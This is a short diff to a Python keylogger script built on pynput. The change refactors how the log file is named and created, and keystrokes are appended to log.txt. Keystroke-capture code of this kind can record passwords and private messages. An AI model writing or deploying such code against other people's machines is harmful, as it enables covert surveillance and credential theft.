@@ -1,8 +1,17 @@
 #!/usr/bin/env python
 from pynput.keyboard import Key, Listener
+from pathlib import Path
 
+# Global variables
 count = 0
 keys = []
+LOG_FILE_NAME = "log.txt"
+LOG_PATH = Path(LOG_FILE_NAME)
+
+# If file doesn't exist, create it
+if not LOG_PATH.is_file():
+    f = open(LOG_FILE_NAME, "w")
+    f.close()
 
 
 def on_press(key):
@@ -25,7 +34,7 @@ def on_release(key):
 
 
 def write_file(keys):
-    with open("log.txt", "a") as f:
+    with open(LOG_FILE_NAME, "a") as f:
         for key in keys:
             k = str(key).replace("'", "")
             if k.find("space") > 0:
